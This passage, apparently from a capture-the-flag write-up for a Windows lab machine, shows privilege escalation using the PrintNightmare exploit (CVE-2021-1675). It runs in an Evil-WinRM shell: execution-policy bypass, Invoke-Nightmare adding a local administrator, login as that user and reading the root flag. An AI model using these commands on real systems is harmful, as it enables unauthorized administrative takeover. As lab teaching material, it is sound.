+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\tony\Documents&gt; ls \\localhost\pipe\spoolss
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory<span style="color:#960050;background-color:#1e0010">:</span> \\localhost\pipe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>                                                 spoolss
+</span></span></code></pre></div><p>Let&rsquo;s transfer over the <a href="https://github.com/calebstewart/CVE-2021-1675">PowerShell implementation</a> and bypass the execution policy</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\tony\Documents&gt; Set-ExecutionPolicy Bypass -Scope <span style="color:#66d9ef">Process</span>
+</span></span></code></pre></div><p><em>Note: if you try something like <code>powershell -ep bypass</code> it won&rsquo;t work</em></p>
+<p>Then we import the module and create an admin user</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\tony\Documents&gt; Invoke-Nightmare -NewUser <span style="color:#e6db74">&#34;hacker&#34;</span> -NewPassword <span style="color:#e6db74">&#34;Pwnd1234!&#34;</span> -DriverName <span style="color:#e6db74">&#34;PrintIt&#34;</span>
+</span></span><span style="display:flex;"><span>[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
+</span></span><span style="display:flex;"><span>[+] using pDriverPath = <span style="color:#e6db74">&#34;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll&#34;</span>
+</span></span><span style="display:flex;"><span>[+] added user hacker as local administrator
+</span></span><span style="display:flex;"><span>[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
+</span></span></code></pre></div><p>We see that our user has been added</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\tony\Documents&gt; net user
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User accounts <span style="color:#66d9ef">for</span> \\
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>Administrator            DefaultAccount           Guest
+</span></span><span style="display:flex;"><span>hacker                   tony
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\tony\Documents&gt; net localgroup administrators
+</span></span><span style="display:flex;"><span>Alias name     administrators
+</span></span><span style="display:flex;"><span>Comment        Administrators have complete and unrestricted access to the computer/domain
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Members
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>Administrator
+</span></span><span style="display:flex;"><span>hacker
+</span></span><span style="display:flex;"><span>The command completed successfully.
+</span></span></code></pre></div><p>Now we can log in as that user</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">└──╼</span> $evil-winrm -i <span style="color:#ae81ff">10.10</span>.11.106 -u hacker -p <span style="color:#e6db74">&#34;Pwnd1234!&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Warning<span style="color:#960050;background-color:#1e0010">:</span> Remote path completions is disabled due to ruby limitation<span style="color:#960050;background-color:#1e0010">:</span> quoting_detection_proc() <span style="color:#66d9ef">function</span> is unimplemented on this machine
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Data<span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#66d9ef">For</span> more information, check Evil-WinRM GitHub<span style="color:#960050;background-color:#1e0010">:</span> https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/Hackplayers/evil-winrm<span style="color:#75715e">#Remote-path-completion</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Info<span style="color:#960050;background-color:#1e0010">:</span> Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\hacker\Documents&gt;
+</span></span></code></pre></div><p>Then we can grab the root flag from the administrator&rsquo;s desktop</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\users\administrator\Desktop&gt; type root.txt
+</span></span><span style="display:flex;"><span>eed37470a518c3102764fbd54c09a40a
 </span></span></code></pre></div>
 </content>
 <p>
